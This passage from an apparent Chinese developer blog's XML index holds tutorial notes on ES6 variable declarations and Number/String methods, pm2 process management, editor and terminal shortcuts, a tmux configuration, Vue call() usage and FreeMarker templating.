    <content type="text"><![CDATA[let 只在代码块内有效 不存在变量提升（只能先声明后使用）（变量提升指变量在声明之前使用，值为ReferenceError） 1234567// var 的情况console.log(foo); // 输出undefinedvar foo = 2;// let 的情况console.log(bar); // 报错ReferenceErrorlet bar = 2; 暂时性死区（声明之前变量不可用）（暂时性死区简称“TDZ”）例1： 1234567var tmp = 123;if (true) &#123; tmp = 'abc'; // ReferenceError let tmp;&#125; 例2： 1234567891011if (true) &#123; // TDZ开始 tmp = 'abc'; // ReferenceError console.log(tmp); // ReferenceError let tmp; // TDZ结束 console.log(tmp); // undefined tmp = 123; console.log(tmp); // 123&#125; 例3： 12typeof x; // ReferenceErrorlet x; 不允许重复申明（不允许在相同作用域内重复声明同一个变量）例1： 1234567891011// 报错function () &#123; let a = 10; var a = 1;&#125;// 报错function () &#123; let a = 10; let a = 1;&#125; 例2： 123456789function func(arg) &#123; let arg; // 报错&#125;function func(arg) &#123; &#123; let arg; // 不报错 &#125;&#125; let新增块级作用域 ES5只有全局作用域和函数作用域 ES5函数只能在顶层作用域和函数作用域内声明，不能在块级作用域内声明 12345678910111213141516// ES5 情况一：非法if (true) &#123; function f () &#123;&#125;&#125;// ES5 情况二：非法try &#123; function f () &#123;&#125;&#125; catch (e) &#123; // ...&#125;// ES6if (true) &#123; function f () &#123;&#125;&#125; 在块级作用域内，函数声明语句的行为类似于let，在块级作用域之外不可引用，对作用域之外并不会影响 123456789// 对于本例：function f() &#123; console.log('I am outside!'); &#125;(function () &#123; if (false) &#123; // 重复声明一次函数f function f() &#123; console.log('I am inside!'); &#125; &#125; f();&#125;()); 12345678// ES5实际运行代码：结果为：I am inside!function f() &#123; console.log('I am outside!'); &#125;(function () &#123; function f() &#123; console.log('I am inside!'); &#125; if (false) &#123; &#125; f();&#125;()); 12345// ES6实际运行代码：结果为：I am outside!function f() &#123; console.log('I am outside!'); &#125;(function () &#123; f();&#125;()); const声明常量，不可变指的是该常量指向的地址，而不是常量本身 const声明一个只读的常量，一旦声明，常量的值就不能改变 12345const PI = 3.1415;PI // 3.1415PI = 3;// TypeError: Assignment to constant variable. const一旦声明变量，就必须立即初始化，不能等到以后赋值 12const foo;// SyntaxError: Missing initializer in const declaration 只在声明所在的块级作用域内有效 12345if (true) &#123; const MAX = 5;&#125;MAX // Uncaught ReferenceError: MAX is not defined const声明的常量也不存在变量提升 存在暂时性死区 只能先声明后使用 不可重复声明 对于复合类型的变量，变量名不指向数据，而是指向数据所在的地址。即const命令只是保证变量名指向的地址不变，而不是保证数据不变，所以使用const声明为常量必须小心。 12345const foo = &#123;&#125;;foo.prop = 123;foo.prop// 123foo = &#123;&#125;; // TypeError: "foo" is read-only 上例中：常量foo存储的是一个地址，这个地址指向一个对象。所谓不可变的是这个地址，不能把foo指向另一个地址，但是该对象本身是可变的，可以为这个对象添加新属性等 1234const a = [];a.push('Hello'); // 可执行a.length = 0; // 可执行a = ['Dave']; // 报错 上例中：常量a是一个数组，这个数组本身是可写的，但是将另一个数组赋给a，就会报错，因为改变了a指向的地址 ES6其他声明变量的方法共6中声明变量的方法: ES5两种：var 和 function ES6新增的：let 和 const ES6其他：import 和 class]]></content>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ES6 number方法]]></title>
    <url>%2Fblog%2Fes6%2Fes6-number%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[参考：阮一锋 ES6 Number方法 进制表示法 二进制：前缀0b（或0B） 1Number('0b111') // 7 八进制：前缀0o（或0O） 1Number('0o10') // 8 Number.isInfinte()：检查一个数值是否为有限的 12345678910111213Number.isFinite(15); // trueNumber.isFinite(Infinity); // falseNumber.isFinite(-Infinity); // falseNumber.isFinite(NaN); // false，任何非数值都是无限的Number.isFinite('foo'); // falseNumber.isFinite('15'); // falseNumber.isFinite(true); // false Number.isNan()：检查一个值是否为NaN 12345678910111213Number.isNaN(NaN) // trueNumber.isNaN(9/NaN) // trueNumber.isNaN('true'/0) // trueNumber.isNaN('true'/'true') // trueNumber.isNaN(15) // falseNumber.isNaN('15') // falseNumber.isNaN(true) // false Number.parseInt()：es6保持不变，转换成整型Number.parseFloat()：es6保持不变，转换成浮点型 1234567891011// ES5的写法parseInt('12.34') // 12parseFloat('123.45#') // 123.45// ES6的写法Number.parseInt('12.34') // 12Number.parseFloat('123.45#') // 123.45 Number.isInteger()：判断一个值是否为整数，js中3和3.0被视为同一个值 123456789Number.isInteger(25) // trueNumber.isInteger(25.0) // trueNumber.isInteger(25.1) // falseNumber.isInteger("15") // falseNumber.isInteger(true) // false Number.EPSILON()：极小的常量 123Number.EPSILON // 2.220446049250313e-16Number.EPSILON.toFixed(20) // '0.00000000000000022204' 因浮点数运算存在误差，引入一个这么小的常量目的在于为浮点数计算设置一个误差范围 es5中： 123450.1 + 0.2 // 0.300000000000000040.1 + 0.2 - 0.3 // 5.551115123125783e-175.551115123125783e-17.toFixed(20) // '0.00000000000000005551' es6中： 15.551115123125783e-17 &lt; Number.EPSILON // true 1234567function withinErrorMargin (left, right) &#123; return Math.abs(left - right) &lt; Number.EPSILON;&#125;withinErrorMargin(0.1 + 0.2, 0.3) // truewithinErrorMargin(0.2 + 0.2, 0.3) // false Number.isSafeInteger()：判断一个整数是否落在这个范围之内这个范围：123456789101112JavaScript能够准确表示的整数范围再-2^53到2^53之间（不含两个端点），超过这个范围，无法精确表示es5:```jsMath.pow(2, 53) // 90071992547409929007199254740992 // 90071992547409929007199254740993 // 9007199254740992Math.pow(2, 53) === Math.pow(2, 53) + 1 // true es6:ES6引入了12345678```jsNumber.MAX_SAFE_INTEGER === Math.pow(2, 53) - 1 // trueNumber.MAX_SAFE_INTEGER === 9007199254740991 // trueNumber.MIN_SAFE_INTEGER === -Number.MAX_SAFE_INTEGER // trueNumber.MIN_SAFE_INTEGER === -9007199254740991 // true 应用： 12345678910111213141516171819202122232425Number.isSafeInteger('a') // falseNumber.isSafeInteger(null) // falseNumber.isSafeInteger(NaN) // falseNumber.isSafeInteger(Infinity) // falseNumber.isSafeInteger(-Infinity) // falseNumber.isSafeInteger(3) // trueNumber.isSafeInteger(1.2) // falseNumber.isSafeInteger(9007199254740990) // trueNumber.isSafeInteger(9007199254740992) // falseNumber.isSafeInteger(Number.MIN_SAFE_INTEGER) // trueNumber.isSafeInteger(Number.MIN_SAFE_INTEGER - 1) // falseNumber.isSafeInteger(Number.MAX_SAFE_INTEGER) // trueNumber.isSafeInteger(Number.MAX_SAFE_INTEGER + 1) // false]]></content>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ES6 string方法]]></title>
    <url>%2Fblog%2Fes6%2Fes6-string%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[参考：阮一峰 ES6 字符串方法 at(): 返回给定字符的位置 12var s = 'Hello world!';s.at(0) // H includes(): 是否包含指定字符串，第二个参数可选，表示起始查找位置 startsWith(): 参数是否在头部，第二个参数可选，表示起始查找位置 endsWith(): 参数是否在尾部，第二个参数可选，表示起始查找位置 123456789var s = 'Hello world!';s.startsWith('Hello') // trues.endsWith('!') // trues.includes('o') // truevar s = 'Hello world!';s.startsWith('world', 6) // trues.endsWith('Hello', 5) // trues.includes('Hello', 6) // false repeat(): 返回重复多次后的字符串 12345678var s = 'Hello's.repeat(3) // HelloHelloHellos.repeat(2.9) // HelloHello，参数为小数时为取整次数s.repeat(Infinity) // 报错s.repeat(-1) // 报错s.repeat(-0.8) // ""，-1~0取整后为0s.repeat("2") // HelloHell0，字符串先转换成数字再取整s.repeat("world") // "" padStart(): 头部补全，第一参数表示字符串长度，第二参数可选，表示替补的字符串，如无，以空格替补 padEnd(): 尾部补全，第一参数表示字符串长度，第二参数可选，表示替补的字符串，如无，以空格替补 123456789101112131415161718var s = 'x's.padStart(5, 'ab') // 'ababx's.padStart(4, 'ab') // 'abax's.padStart(4, 'abcdefg') // 'abcx' ，多余的会被去掉s.padEnd(5, 'ab') // 'xabab's.padEnd(4, 'ab') // 'xaba' s.padEnd(4, 'abcdefg') // 'xabc' ，多余的会被去掉var s = 'xxxx's.padStart(2, 'ab') // 'xxxx'，当设置的字符串长度小于原本长度，返回原字符串s.padEnd(4, 'ab') // 'xxxx' ，当设置的字符串长度小于原本长度，返回原字符串var s = 'x's.padStart(3) // ' x's.padEnd(4) // 'x '常用来补全位数：'10'.padStart(10, '0') // "0000000010" 模板字符串 1234567891011121314传统输出模板：$('#result').append( 'There are &lt;b&gt;' + basket.count + '&lt;/b&gt; ' + 'items in your basket, ' + '&lt;em&gt;' + basket.onSale + '&lt;/em&gt; are on sale!'); es6输出模板：$('#result').append(` There are &lt;b&gt;$&#123;basket.count&#125;&lt;/b&gt; items in your basket, &lt;em&gt;$&#123;basket.onSale&#125;&lt;/em&gt; are on sale!`);]]></content>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用pm2永久开启node服务器]]></title>
    <url>%2Fblog%2Fnode%2F%E4%BD%BF%E7%94%A8pm2%E6%9D%A5%E6%B0%B8%E4%B9%85%E5%BC%80%E5%90%AFnode%E6%9C%8D%E5%8A%A1%E5%99%A8.html</url>
    <content type="text"><![CDATA[前言：我们知道在跑node程序的时候，我们需要开启一个终端来执行node的命令，当终端关闭时，node服务器也相应的关闭了，如何保持node服务器的永久开启而不依赖窗口呢？ 使用pm2可以永久开启node服务器而不受终端窗口的限制，pm2 是一个带有负载均衡功能的Node应用的进程管理器.当你要把你的独立代码利用全部的服务器上的所有CPU，并保证进程永远都活着，0秒的重载， pm2是完美的。 1、全局安装1sudo npm install pm2@latest -g 2、举例如使用vue-cli工具时我们需要用到npm run dev命令，我们知道，执行的其实下面的node build/dev-server.js命令123456"scripts": &#123; "dev": "node build/dev-server.js", "build": "node build/build.js", "test": "", "lint": "eslint --ext .js,.vue src"&#125; 我们可以使用pm2来替代运行上面的程序 方法1： 1pm2 start build/dev-server.js 当我们启动一个程序的时候，会看到： 当我们启动一两个个程序的时候，会看到： 我们可以给这个进程自定义一个名字： 1pm2 start build/dev-server.js --name vue-cli 这个时候会看到原先的那个进程被杀掉了errored 方法2：直接通过原先的命令来替换执行 1pm2 start npm -- run dev # npm run dev 的替换命令 3、用法 最简单的启用一个应用：pm2 start app.js 停止：pm2 stop app_name|app_id 删除：pm2 delete app_name|app_id 删除所有：pm2 delete all 重启：pm2 restart app_name|app_id 停止所有：pm2 stop all 查看所有的进程：pm2 list 查看所有的进程状态：pm2 status 查看某一个进程的信息：pm2 describe app_name|app_id 监视每个node进程的CPU和内存的使用情况：pm2 monit 4、负载均衡123pm2 start app.js -i 3 # 开启三个进程pm2 start app.js -i max # 根据机器CPU核数，开启对应数目的进程 5、开机自动启动12345通过 pm2 save 保存当前进程状态。通过 pm2 startup [platform] 生成开机自启动的命令。例如：pm2 startup centos/ubuntu将步骤2生成的命令，粘贴到控制台进行，搞定。 6、更新pm2123npm install pm2@latest -g # 更新版本pm2 update # 更新内存 和pm2相同的工具，如forever，请查看简书极地瑞雪 (使用forever让node.js持久运行)]]></content>
      <tags>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac Chrome常用快捷键]]></title>
    <url>%2Fblog%2Ftools%2Fmac-chrome%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE.html</url>
    <content type="text"><![CDATA[标签页和窗口页Command + N : 新开窗口Command + Shift + N : 隐身模式打开新开窗口Command + Shift + W : 关闭窗口Command + T : 新开标签页Command + W : 关闭标签页Command + Shift + T ： 重新打开上一次关闭的页面（最多10个）Command + Option + Left : 切换到上一个标签页Command + Optionn + Right : 切换到下一个标签页Command + [ 或 Command + Left :切换到上一个历史记录Command + ] : 切换到下一个历史记录Command + O : 打开文件Command + 点击链接 ： 新标签打开链接（仍然在本标签页）Command + Shift + 点击链接 : 新标签打开链接（同时切换到新标签页）Shift + 点击链接 : 新窗口打开链接Command + M : 最小化窗口Command + H : 隐藏当前窗口Command + Option + H : 隐藏所有窗口Command + Q : 关闭浏览器 功能快捷键Command + Shift + B : 显示或关闭书签栏Command + Option + B : 打开书签管理器Command + , : 打开偏好设置Command + Y ： 打开历史记录Command + Shift + J : 打开下载内容Command + Shift + Delete : 打开清楚浏览器数据弹窗 地址栏Option + L : 选中地址栏 网页快捷键Command + P : 打印当前网页Command + R : 刷新页面Command + F : 开启查找功能Command + G 或 Enter : 查找下一个Command + Shift + G 或 Shift + Enter : 查找上一个Command + E : 查找选中的文字Command + Option + J : 打开“JavaScript”控制台Command + Option + U : 打开源码Option + 点击链接 ： 下载链接目标Option + D : 保存书签Command + 加减 ： 放大或缩小网页Command + 0 : 恢复成默认大小的网页空格键 : 滚动网页]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac Sublime常用快捷键]]></title>
    <url>%2Fblog%2Ftools%2Fmac-sublime%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE.html</url>
    <content type="text"><![CDATA[Command + F ：搜索选中的文字Command + D : 连续搜索选中的文字Command + G ：搜索下一个Command + Shift + G : 搜索上一个Command + Shift + F : 全局查找或替换 Command + Shift + D : 复制并粘贴当前行Command + Control + Up/Down : 上下移动代码Command + Enter : 在当前行下方增加一行Command + Shift + Enter ：在当前行上方增加一行 Command + Left/Right : 光标移动当前行的左侧或右侧Command + Shift + Left/Right : 选中光标所在当前行的左边或右边部分代码Command + Up/Down : 快速移到顶部或底部Command + Shift + Up/Down : 选中光标左上或右下部分代码Command + L : 选中当前一行，连续可选中下一行选中后Command + Shift + L : 在每行尾部产生一个光标，可操控多行 Command + W : 关闭当前窗口Command + Shift + W : 关闭所有窗口，同时关闭sublimeCommand + Option + Left/Right : 左右切换窗口 Command + + / - : 放大或缩小文字Command + Option + Num : 分割几块窗口]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tmux相关操作]]></title>
    <url>%2Fblog%2Ftools%2Ftmux%E6%93%8D%E4%BD%9C.html</url>
    <content type="text"><![CDATA[tmux快捷键（已经修改了默认配置）12345678910111213141516171819tmux 终端快捷键设置：cat ~/.tmux.conf 查看sudo vim ~/.tmux.conf 修改使用tmux开启多个终端，快捷键如下：tmux 进入tmux我的快捷键使用（通过cat ~/.tmux.conf设置）:Ctrl + A 、 - 横向分屏Ctrl + A 、 | 竖向分屏exit 关闭当前窗口Ctrl + A 、D # 将多个终端放入后台隐藏，显示一个终端tmux at # 重新切换回多个终端状态Ctrl + A、（up、down、left、right） # 在多个终端中切换输入Ctrl + A +（up、down、left、right） # 改变当前终端的大小Ctrl + A、[ 、（up、down、left、right） # 在当前终端可以滚ZCtrl + A、Z # 当前终端最大化最小化Ctrl + A、C # 当前窗口分屏（全屏）Ctrl + A、， # 更改窗口地步名称 修改配置如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# 编码setw -g utf8 onset -g status-utf8 on# 基础设置set -g default-terminal "screen-256color"set -g display-time 3000set -g escape-time 0set -g history-limit 65535set -g base-index 1set -g pane-base-index 1# 前缀绑定 (Ctrl+a)set -g prefix ^aunbind ^bbind a send-prefix# 分割窗口unbind '"'bind - splitw -vunbind %bind | splitw -h# 选中窗口bind-key k select-pane -Ubind-key j select-pane -Dbind-key h select-pane -Lbind-key l select-pane -R# copy-mode 将快捷键设置为 vi 模式setw -g mode-keys vi# 启用鼠标(Tmux v2.1 之前)setw -g mode-mouse onset -g mouse-select-pane onset -g mouse-resize-pane onset -g mouse-select-window on# Ubuntu 支持复制bind -t vi-copy y copy-pipe "xclip -sel clip -i"# 启用鼠标(Tmux v2.1)#setw -g mouse on# to enable mouse scroll, see https://github.com/tmux/tmux/issues/145#issuecomment-150736967#bind -n WheelUpPane if-shell -F -t = "#&#123;mouse_any_flag&#125;" "send-keys -M" "if -Ft= '#&#123;pane_in_mode&#125;' 'send-keys -M' 'copy-mode -e'"# 更新配置文件bind r source-file ~/.tmux.conf \; display "已更新"]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim编辑器相关操作]]></title>
    <url>%2Fblog%2Ftools%2Fvim%E7%BC%96%E8%BE%91%E5%99%A8%E6%93%8D%E4%BD%9C.html</url>
    <content type="text"><![CDATA[vim快捷键常用操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102需使用sudo apt-get install vim # Linuxsudo homebrew install vim # Mac OS终端输入vim即可进入到vim编辑器：# vim不保存退出vim编辑器：# :q! &lt;Enter&gt;跳到vim之外（需小心，所有的改变都会丢失）# :qa!&lt;Enter&gt;保存修改的文件并退出：# :wq &lt;Enter&gt; / :wq! &lt;Enter&gt;回到正常状态：# Esc撤销：# u：从最后执行的命令挨个撤销(只能撤销未保存退出的)往回撤销：# Ctrl - R：撤销撤销命令移动光标：挨个移动：# up(k)、down(j)、left(h)、right(l)整屏移动：# &lt;Ctrl-f&gt;：向下移动一屏()# &lt;Ctrl-d&gt;：向下移动半屏(down)# &lt;Ctrl-b&gt;：向上移动一屏()# &lt;Ctrl-u&gt;：向上移动半屏(up)其他快速移动：# 0：移动到行首# 2w：向前移动到2个单词的首字母# 3e：向前移动到3个单词的末尾# G：到文件尾# gg：到文件首# numG：移动光标到指定的行（num）。（比如 10G 就是到第 10 行）# &lt;Ctrl - g&gt;：查看当前行信息：文件名、行号、全文行号、占全文百分比、列号# H：移动光标到屏幕上面# M：移动光标到屏幕中间# L：移动光标到屏幕下面单词自动补全：# Ctrl + D 或 Tab删除：# x：删除一个字母# dd：删除一个当前行# 2dd：删除连续的两行# cw/ce：删除当前单词并进入插入模式，可修改当前错误单词# c$：删除当前行在光标后面的所有字符并进入插入模式，大幅修改添加：# a：在光标处添加，类似i替换：# r：点击r后即可替换当前1个字符，使用单个字符的修改插入：# i：在当前字符的左边插入# I：在当前行首插入# a：在当前字符的右边插入# A：在当前行尾插入# o：在当前行下面插入一个新行# O：在当前行上面插入一个新行选择（高亮）：# v：按字符选择。经常使用的模式，所以亲自尝试一下它。# V：按行选择。这在你想拷贝或者移动很多行的文本的时候特别有用。# Ctrl +V：按块选择。非常强大。剪切、复制：# d：剪贴选择的内容到剪贴板。# y：拷贝选择的内容到剪贴板。# c：剪贴选择的内容到剪贴板并且进入插入模式。## dd：剪切当前行。# yy：拷贝当前行。# cc：剪切当前行并且进入插入模式。## D：剪切从光标位置到行尾到剪贴板。# Y：拷贝当前行。# C：和 D 类似，最后进入插入模式。## x：剪切当前字符到剪贴板。# s：和x类似，不过最后进入插入模式。粘贴：# p：粘贴（当前一步为删除操作时，删除的字符会存在寄存器中，此时按p会在当前光标的下一行粘贴插入）搜索查找：# /error： / + 需要搜索的单词，可顺向查找，输入n可查找到下一个，输入N可反方向查找到下一个# ?error：？ + 需要搜索的单词，可逆向查找匹配括号：# %：光标定位在括号的某一处，输入%后光标自动切换到匹配的另外一处在VIM中输入外部命令：# ！：输入！+ 外部命令，如！+ls]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows Chrome常用快捷键]]></title>
    <url>%2Fblog%2Ftools%2Fwindows-chrome%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE.html</url>
    <content type="text"><![CDATA[Ctrl + T : 打开新的标签页Ctrl + Shift + T : 打开上一次关闭的标签页Ctrl + W : 关闭当前标签页Ctrl + Shift + W : 关闭所有标签页（关闭浏览器）Ctrl + PgUp : 向左切换标签Ctrl + PgDn : 向右切换标签Ctrl + - : 缩小窗口Ctrl + + : 放大窗口Ctrl + 0 : 回到默认窗口大小Ctrl + R : 刷新页面（F5）Ctrl + U : 查看源码Ctrl + O : 打开文件Ctrl + Shift + O : 打开书签管理器Ctrl + P : 打开打印设备Ctrl + S : 保存网页Ctrl + F/G : 打开搜索Ctrl + H : 打开历史记录Ctrl + J : 当前窗口打开下载中心Ctrl + Shift + T : 新窗口打开下载中心Ctrl + N : 打开新窗口Ctrl + 1 : 打开1号标签，依次类推Ctrl + Shift + I/C : 打开开发者工具（F12）Ctrl + Shift + B : 显示书签/隐藏书签]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows Sublime编辑器常用快捷键]]></title>
    <url>%2Fblog%2Ftools%2Fwindows-sublime%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE.html</url>
    <content type="text"><![CDATA[查找快捷键Ctrl+F: 搜索查找F3: 查找下一个Shift+F3: 查找上一个Ctrl+F3: 快速查找出光标定位的某个元素，连续可查找一个Alt+F3: 快速查找出光标定位的所有元素，查找所有Ctrl+Shift+F: 查找并替换Ctrl+H: 替换Ctrl+G: 跳转到第几行Ctrl+M: 选择当前匹配的括号 关闭快捷键Ctrl+W: 关闭当前打开文件Ctrl+Shift+W: 关闭所有打开文件 注释快捷键Ctrl+/ /: 注释HTMLCtrl+/: 注释当前行Ctrl+Shift+/: 注释段落 选择快捷键Ctrl+D: 选中光标定位的单词，连续可选中下一个Ctrl+L: 选中当前行，连续可选中下一行Ctrl+Enter: 在该行下面增加一行Ctrl+Shift+Enter: 在该行上面增加一行Ctrl+X: 删除当前行Shift+up: 从光标前面开始选择行，连续可选中上一行Shift+down: 从光标后面开始选择行，连续可选中下一行Shift+left: 从光标处连续选择左边的文本Shift+right: 从光标处连续选择右边的文本Ctrl+Shift+up: 选择本行，并向上移动一行Ctrl+Shift+down: 选择本行，并向下移动一行Ctrl+Shift+left: 从光标处连续选择左边的单位Ctrl+Shift+right: 从光标处连续选择右边的单位Ctrl+Alt+up: 向上添加多个光标，可同时输入Ctrl+Alt+down: 向下添加多个贯标，可同时输入 切换标签快捷键Ctrl+PageUp: 向左切换标签页Ctrl+PageDown: 向右切换标签页 插件快捷键代码快速编写(Emmet)： Tab/Ctrl+E语法提示框架(SublimeLinter)：右键菜单增强(SideBarEnhancements)：JS格式化工具(JSFormat)： Ctrl+Alt+FHTML格式化工具(TAG)： Ctrl+Alt+F全局格式化工具(HTML+CSS+JS Prettify): Ctrl+Shift+H颜色选择器(ColorPicker)： Ctrl+Shift+C代码高亮显示(SublimeHighlight)： Edit–Highlight–Convert to HTML（写博客时使用）代码提示工具(BracketHighlighter)： 光标左侧出现提示（提示匹配的括号、引号和标签）代码提示工具(TrailingSpacer)： 光标左侧出现提示（提示多余空格和Tab） Sublime Text3设置F12打开默认浏览器：1.安装SlideBar插件2.用户操作设置123&#123; "default_browser": "chrome"&#125; 3.用户按键设置123456789[&#123; "keys": ["f12"], "command": "side_bar_open_in_browser", "args": &#123; "paths": [], "type": "testing", "browser": "" &#125;&#125;]]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac Tmux常用快捷键]]></title>
    <url>%2Fblog%2Ftools%2Fmac-tmux%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE.html</url>
    <content type="text"><![CDATA[已经把ctrl-b修改成ctrl-a，横向切割和纵向切割也修改成功|和- 修改： vim ~/.tmux.conf修改生效：ctrl-a : source-file ~/.tmux.conf tmux : 启动tmuxctrl-a d : 退出tmux会话 tmux a -t 0 : 启动之前的tmux窗口 ctrl-a , : 重命名窗口名ctrl-a c : 新开窗口(对应的窗口数字：0, 1, 2, 3, …)ctrl-a &amp; : 关闭当前整个窗口ctrl-a num : 切换到指定的窗口(0, 1, 2, 3, …)ctrl-a p : 切换到上一个窗口(循环)ctrl-a n : 切换到下一个窗口(循环)ctrl-a w : 以菜单形式显示所有窗口，再切换窗口 ctrl-a | : 横向切割ctrl-a - : 纵向切割ctrl-a o : 切换到下一个分割窗口(循环)ctrl-a direaction : 上下左右切换分割窗口ctrl-a x : 询问是否关闭当前的分割窗口ctrl-d : 直接关闭当前分割窗口ctrl-a ! : 关闭所有的分割窗口ctrl-a z : 最大化/最小化 当前分割窗口 ctrl-a ? : 显示帮助ctrl-a t : 显示时钟 ctrl-a [ : 开始滚屏，按方向键滚动，q 退出]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac 常用快捷键]]></title>
    <url>%2Fblog%2Ftools%2Fmac%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE.html</url>
    <content type="text"><![CDATA[基本操作Command-X 剪切（剪切文字）Command-C、Command-Option-V 剪切 粘贴（文件）Command-C 拷贝（相当于windows的复制，MacOS的复制为先拷贝再粘贴两部操作） Command-V 粘贴Command-Option-V 粘贴（删除源文件） Command-Z 撤销Command-Shift-Z 撤销的逆向操作Command-A 全选 Command-S 保存（Save) Command-F 查找（Find）Command-Shift-A 打开当前文件所有的文件夹 截图Command-Shift-3 截取全部屏幕到一个文件（桌面）Command-Shift-4 截取所选屏幕区域到一个文件（桌面）Command-Shift-4,出现相机后按空格，将相机移到需要的窗口上 截取指定的窗口 Command-Shift-Control-3 截取全部屏幕到剪贴板Command-Shift-Control-4 截取所选屏幕区域到剪贴板Command-Shift-Control-4,出现相机后按空格，将相机移到需要的窗口上 截取指定的窗口到剪切板 在应用程序中Command-Option-Esc 打开强制退出窗口 Command-H 隐藏当前正在运行的应用程序窗口 Command-Option-H 隐藏其他应用程序窗口 Command-Q 退出最前面的应用程序 Command-Shift-Z 重做，也就是撤销的逆向操作Command-Tab 在打开的应用程序列表中转到下一个最近使用的应用程 文本处理Command-B 切换所选文字粗体（Bold）显示 fn-Delete 相当于PC全尺寸键盘上的Delete，也就是向后删除fn-Up 向上滚动一页fn-Down 向下滚动一页fn-Left 滚动至文稿开头fn-Right 滚动至文稿末尾 Command-Left 将光标移至当前行的行首 Command-Right 将光标移至当前行的行尾Command-Up 将光标移至文稿开头Command-Down 将光标移至文稿末尾 Option-Left 将光标移至上一个单词的开头Option-Right 将光标移至下一个单词的末尾 Control-A 移至行或段落的开头 在Finder中：Command-Shift-N 新建文件夹 Command-Shift-G 调出窗口，可输入绝对路径直达文件夹（Go） return 点击文件，按下可重命名文件 Command-O 打开所选项 Command-Up 打开包含当前文件夹的文件夹，相当于Windows里的“向上” Command-Delete 将文件移至废纸篓 Command-Shift-Delete 清倒废纸篓 空格键 快速查看选中的文件，也就是预览功能]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[call方法实现跨对象调用方法]]></title>
    <url>%2Fblog%2Fvue%2Fcall%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E8%B7%A8%E5%AF%B9%E8%B1%A1%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[在vue的项目开发中，我们知道，在一个组件中，this指向的是当前的组件对象，但是当我们在处理一个大型的项目，而且要调用一些公共的方法或函数，且在函数中又要继续调用下一个函数，例如：组件A中：123456789101112131415161718mounted () &#123; this.funcA&#125;,methods: &#123; funcA () &#123; this.funcB(b) &#125;, funcB (B) &#123; // 一些公共的函数，如支付或js bridge等 this.funcC(c) &#125;, funcC (C) &#123; // 一些公共的函数，如支付或js bridge等 this.funcD(d) &#125;, funcD (D) &#123; &#125;&#125; 在上面的示例中，我们在调用组件A的方法funcA()之后需要连续调用两个外部支持的函数，且之前有参数传递，最后又要调用组件A的方法funcD()，当funcB()和funcC()方法在组件B中也需要调用时，我们如果在组件B中再重复写一套就很麻烦了，所有有些时候，我们需要将一定的方法剥离出去。 可以这样做:组件A中：123456789101112import &#123;funcB, funcC&#125; from '../tools/bridge.js'mounted () &#123; this.funcA&#125;,methods: &#123; funcA () &#123; funcB.call(this, b) // 此处将this对象通过call方法传递给外部函数funcB &#125;, funcD (D) &#123; &#125;&#125; 公共方法bridge.js中：123456789101112funcB (B) &#123; let self = this // 一些公共的函数，如支付或js bridge等 funcC.call(self, c)&#125;funcC (C) &#123; // 一些公共的函数，如支付或js bridge等 self.funcD(d) // 此处通过self指向组件中的funcD&#125;export &#123; funcB, funcC &#125;]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在ftl的js中获取freemarker的值]]></title>
    <url>%2Fblog%2Ffreemarker%2Fjs%E8%8E%B7%E5%8F%96freemarker%E7%9A%84%E5%80%BC.html</url>
    <content type="text"><![CDATA[假设后端往ftl模板中注入了下列值1234567891011121314151617testA: 'aaaa'testB: &#123; bDataOne: 'b1', bDateTwo: 'b2'&#125;testC: [ &#123; cDateOne: 'c11' cDateTwo: 'c12' &#125;, &#123; cDateOne: 'c21' cDateTwo: 'c22' &#125;] 想在ftl页面的js中获取testA、testB、testC12345678910111213141516171819202122// 获取testAvar getA = &quot;$&#123;testA!&apos;&apos;&#125;&quot;;// 获取testB&lt;#if testB?? &amp;&amp; testB.bDataOne??&gt; var getB1 = &quot;$&#123;testB.bDataOne!&apos;&apos;&#125;&quot;; var getB2 = &quot;$&#123;testB.bDataTwo!&apos;&apos;&#125;&quot;;&lt;/#if&gt;// 获取testC，对于list，我们不能直接使用list数据，必选转换一下才能正常使用// 收集list中每一项的某个key&lt;#if testC??&gt; var arr = []; &lt;#list testC as c&gt; arr.push(&apos;$&#123;c.cDateOne&#125;&apos;) &lt;/#list&gt;&lt;/#if&gt;console.log(arr); // 然后将可以正常的使用了// 获取整个list，正在搜索中...]]></content>
      <tags>
        <tag>FreeMarker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[freemarker部分语法]]></title>
    <url>%2Fblog%2Ffreemarker%2Ffreemarker%E9%83%A8%E5%88%86%E8%AF%AD%E6%B3%95.html</url>
